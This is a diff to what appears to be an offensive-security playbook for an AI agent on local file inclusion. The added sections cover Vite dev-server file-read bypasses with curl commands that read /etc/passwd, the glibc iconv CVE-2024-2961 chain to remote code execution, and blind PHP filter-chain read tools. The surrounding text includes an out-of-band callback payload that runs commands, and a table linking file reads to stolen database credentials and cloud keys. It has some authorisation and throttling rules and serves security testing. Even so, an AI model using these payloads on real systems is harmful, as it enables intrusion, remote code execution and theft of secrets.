@@ -63,6 +63,7 @@ JSON bodies: {"filename":...} {"template":...} {"path":...}
 | Java servlet (`/WEB-INF/`) | `WEB-INF/web.xml`, `classes/`, `application.properties` |
 | Python Flask/Django | `/proc/self/environ`, `settings.py`, `SECRET_KEY` |
 | Node.js file-serve / `res.sendFile`, `express.static` | path-traversal read, `require()` traversal |
+| Vite dev server reachable (`/@vite/client` serves JS, started with `--host`) | `/@fs/` + `?raw??` deny bypass (CVE-2025-30208), raw `.html` reads (CVE-2025-58752), Phase 2b |
 | Windows IIS / .NET | `..\..\web.config`, `C:\Windows\win.ini`, machineKey |
 | Official PHP Docker image (no `php.ini` in `/usr/local/etc/php/`) | `pearcmd.php` → RCE (Phase 8c): PEAR present and `register_argc_argv` at its On default |
 | PHP with `session.use_strict_mode=0` and `save_handler=files` | `PHP_SESSION_UPLOAD_PROGRESS` → controlled session file (Phase 8d) |
@@ -98,6 +99,18 @@ ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
 ?file=C:\inetpub\wwwroot\web.config
 ```
 
+### Phase 2b — Node: exposed Vite dev server
+A Vite **dev** (or `vite preview`) server exposed with `--host` / `server.host` is a file server for the developer's machine or CI box. Fingerprint first: `GET /@vite/client` returning Vite's client JS means dev mode, not a production build.
+```bash
+# CVE-2025-30208 (GHSA-x574-m823-4x7w): /@fs/ honours server.fs.deny, but a ?raw?? or ?import&raw?? suffix bypasses it.
+# Fixed in 6.2.3 / 6.1.2 / 6.0.12 / 5.4.15 / 4.5.10.
+curl -s "https://$TARGET/@fs/etc/passwd?import&raw??"
+# CVE-2025-58752 (GHSA-jqfw-vq24-v9c3): server.fs checks were not applied to .html files (appType spa/mpa, the default,
+# and the preview server). Fixed in 7.1.5 / 7.0.7 / 6.3.6 / 5.4.20. Only .html is reachable, so look for HTML reports/exports.
+curl -s --path-as-is "https://$TARGET/../../../../../../tmp/<known>.html"
+```
+Proof is file content, same rule as everywhere else: the `?raw` variant returns the file as a JS string export, so decode it before quoting it.
+
 ### Phase 3 — PHP Wrappers (source disclosure)
 ```bash
 ?file=php://filter/convert.base64-encode/resource=index.php   # decode base64 → source
@@ -122,6 +135,12 @@ Notes / gotchas:
 - Payloads get **long** (10–50KB). If the param is length-capped or WAF-blocked on size, move it to a POST body, or use a minimal payload (`<?=`shorthand`?>`).
 - For blind targets, set the chain payload to a Collaborator callback (`<?php file_get_contents("http://x.<collab>/".`id`);?>`) to confirm execution OOB.
 - This works even when log poisoning fails (unreadable logs, `open_basedir`). Try it whenever you have a php:// filter read.
+
+### Phase 4b — Read-only sinks: iconv CVE-2024-2961, blind filter-chain oracles, wrapwrap
+Phase 4 needs an `include`. These cover sinks that only **read** (`file_get_contents`, `file()`, `hash_file()`, `copy()`, `getimagesize`) or never reflect.
+- **CVE-2024-2961 (glibc `iconv` out-of-bounds write to ISO-2022-CN-EXT) → RCE from a file read.** Charles Fol, "Iconv, set the charset to RCE" (<https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html>, 2024-05-27); PHP 7.0.0 to 8.3.7 per the write-up; tool `ambionics/cnext-exploits`. Affects glibc 2.39 and older; fixed upstream in 2.40 and backported to the 2.31-2.39 branches (GLIBC-SA-2024-0004), so gate on an **unpatched** glibc build, not on the version number. Stage A: read a known ASCII file through `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=/etc/passwd`; identical content (not an error) proves the charset is reachable, nothing more. The exploit is memory corruption in the PHP worker: **Stage B**, written sign-off.
+- **Blind read via error oracle.** `synacktiv/php_filter_chains_oracle_exploit` (<https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle>) leaks a file char by char from a sink that never reflects, using PHP's "Allowed memory size ... exhausted" error as the boolean. `ambionics/lightyear` (<https://blog.lexfo.fr/lightyear-file-dump.html>) does it without the memory-exhaustion oracle, with payloads that fit a GET and about 6 requests per byte; prefer it. Both cost hundreds to thousands of requests: run serially and throttled, against one small file.
+- **`ambionics/wrapwrap`** — a filter chain that adds a chosen prefix and suffix to the file content, so a read survives a parser before reflection (`{"message":"<file>"}` for a `json_decode` sink, an XML wrapper for an XML one).
 
 ### Phase 5 — Code-Execution Wrappers (config prerequisites)
 ```bash
@@ -362,12 +381,14 @@ Verified, correctly-attributed references for the patterns above:
 - **PHP filter-chain to RCE** — Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. The reason a bare file-read upgrades to Critical.
 - **CVE-2021-41773** — Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) → file read, and RCE when `mod_cgi` is enabled.
 - **CVE-2021-42013** — Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) → traversal/RCE.
+- **CVE-2024-2961** — glibc `iconv` ISO-2022-CN-EXT out-of-bounds write; `php://filter` file read → RCE (Phase 4b). Fixed upstream in glibc 2.40 (GLIBC-SA-2024-0004), backported to older branches.
+- **CVE-2025-30208 / CVE-2025-58752** — Vite dev-server `server.fs` bypasses (`/@fs/` + `?raw??`; unchecked `.html`). Phase 2b; GHSA-x574-m823-4x7w and GHSA-jqfw-vq24-v9c3.
 - **CVE-2024-4577** — PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE.
 - **`pearcmd.php` → RCE (Phase 8c)** — not a CVE; an abuse of PEAR's CLI front end plus PHP's own `register_argc_argv` behaviour. Grounding: [leavesongs, Docker PHP LFI getshell](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html) (original), [watchTowr on Form Tools 3.1.1](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) (the extension-appended variant), php-src `main/php_variables.c` (`php_build_argv` splits the raw query string on `+`), [PHP core ini directives](https://www.php.net/manual/en/ini.core.php) (`register_argc_argv` default and the 8.5.0 deprecation), and the [`docker-library/php`](https://github.com/docker-library/php) Dockerfiles (`--with-pear`, no active `php.ini`).
 - **`PHP_SESSION_UPLOAD_PROGRESS` (Phase 8d)** — not a CVE; documented PHP behaviour. Grounding: [PHP manual, session upload progress](https://www.php.net/manual/en/session.upload-progress.php) and [session configuration](https://www.php.net/manual/en/session.configuration.php) for every default in the table, plus [Orange Tsai's HITCON 2018 one-line-PHP challenge](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/) for the original technique and the cleanup race.
 - Coverage for Phases 8c-8e was checked against the HackTricks `pentesting-web/file-inclusion` pages (<https://github.com/HackTricks-wiki/hacktricks>, CC BY-NC 4.0), used as a checklist only; the preconditions, defaults, staging and safety guidance above are written against the primary sources just listed.
 
-> Grounding note: this skill is built from 31 disclosed LFI/path-traversal reports. When citing a specific HackerOne report in your write-up, link the exact report URL/ID you used — do **not** paraphrase a report ID from memory. A wrong ID is worse than none.
+> Grounding note: this skill is built from 24 disclosed LFI/path-traversal reports. When citing a specific HackerOne report in your write-up, link the exact report URL/ID you used — do **not** paraphrase a report ID from memory. A wrong ID is worse than none.
 
 ---
 
@@ -410,6 +431,7 @@ C:\Windows\System32\inetsrv\config\applicationHost.config
 | LFI primitive | Chain to | Impact |
 |---------------|----------|--------|
 | `php://filter` read | **filter-chain RCE (Phase 4)** | RCE with no upload — **Critical** |
+| `php://filter` on a read-only sink, unpatched glibc | CVE-2024-2961 via cnext-exploits (Phase 4b, Stage B) | RCE — **Critical** |
 | File read | `.env` / `config.php` / `wp-config.php` | DB creds, API keys → backend takeover |
 | File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |
 | Remote URL include | RFI (`allow_url_include`) | direct RCE — **Critical** |
